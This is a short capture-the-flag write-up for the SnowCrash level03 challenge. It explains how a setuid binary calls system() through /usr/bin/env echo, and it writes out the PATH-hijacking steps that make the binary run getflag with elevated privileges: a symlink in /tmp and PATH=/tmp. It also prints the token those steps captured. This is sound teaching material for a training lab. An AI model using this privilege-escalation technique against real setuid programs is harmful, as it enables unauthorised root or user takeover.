# Solution

when we loged in we find a setuid program for flag03 name **level03** so let's decompile that program to see what it does.

Once we look at the pseudo generated C code we find out that this program call **system("/usr/bin/env echo Exploit me")**


The exploit in it self is pretty simple since the echo command is a builtin from bash but also present in form of a binary in /bin/echo,
we will use the leverage that /usr/bin/env provided us to modify the path **giving a false echo command** that would be the **getflag** command in reality

first we need to check that if you provide arguments to **getflag command** it still work as attended so if we do:

```sh
getflag Exploit me
```

the command will work fine and no error will be output from the extra arguments so now let's prepare the exploit.

First we need to create a symlink using **ln** to create a false echo command that **will point to getflag command**.

```sh
ln -sf /bin/getflag /tmp/echo
```

It's really important that we use /tmp or /var/tmp and not create a temp dir with **mktemp -d** because the programs will not be able to have access.
So now the last step will be to change the PATH environment variable.

```sh
export PATH=/tmp
```

Now we are set up to execute the binary and here is the result

```sh
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

**Previously this binary when lunched provided us the result "Exploit me"**
